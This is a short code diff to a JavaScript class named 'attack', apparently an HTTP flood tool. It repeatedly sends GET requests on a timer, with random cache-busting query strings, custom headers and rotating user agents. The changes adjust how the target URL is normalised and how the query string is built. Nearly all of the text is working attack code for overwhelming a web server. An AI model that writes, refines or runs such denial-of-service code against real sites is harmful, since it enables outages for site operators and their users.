@@ -11,6 +11,7 @@ class attack {
     */
 
     constructor(host) {
+    host = getUrl(host);
         this.host = host;
       }
 
@@ -28,7 +29,7 @@ blow() {
   'x-cross-5':getH()
   }
       var options = {
-        url:this.host='/?page='+getH()+'&q='+getH(),
+        url:this.host='?q='+getH(),
         headers:headers
       }
       Req.get(options,function (err, response, body) {
@@ -61,6 +62,11 @@ this.run =  setInterval(function () {
 }
 
 
+
+function getUrl(host) {
+  host +='/';
+  return host.replace(/\/+$/,'/');
+}
 
 function getUserAgent() {
   var users = [
